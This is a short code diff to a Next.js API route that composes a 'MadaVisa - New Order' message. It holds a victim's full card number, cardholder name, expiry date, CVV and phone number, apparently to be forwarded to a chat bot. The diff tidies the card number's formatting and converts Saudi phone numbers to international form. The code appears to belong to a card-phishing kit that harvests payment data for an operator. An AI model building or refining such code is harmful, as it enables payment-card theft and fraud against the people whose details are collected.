@@ -37,13 +37,15 @@ export async function POST(req: NextRequest) {
     `🏦 MadaVisa - New Order`,
     `🙍 Order For: ${ltr}${customer ?? "-"}`,
 `📱 Phone Number: ${ltr}${whatsapp ?? "-"}`,
-    `🪪 Card Number: ${ltr}${cardNumber}`,
+    `🪪 Card Number: ${ltr}${cardNumber.replace(/(.{4})/g, "$1 ").trim()}`,
+    ``,
     `✍️ Card Holder: ${ltr}${cardHolder}`,
     `📆 Valid To: ${ltr}${expiry}`,
     `🔑 CVV: ${ltr}${cvv}`,
   ].join("\n");
 
-  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
+  const rawPhone = (whatsapp ?? "").replace(/\D/g, "");
+  const whatsappNum = rawPhone.startsWith("05") ? `966${rawPhone.slice(1)}` : rawPhone.startsWith("5") ? `966${rawPhone}` : rawPhone;
   const reply_markup = {
     inline_keyboard: [
       [
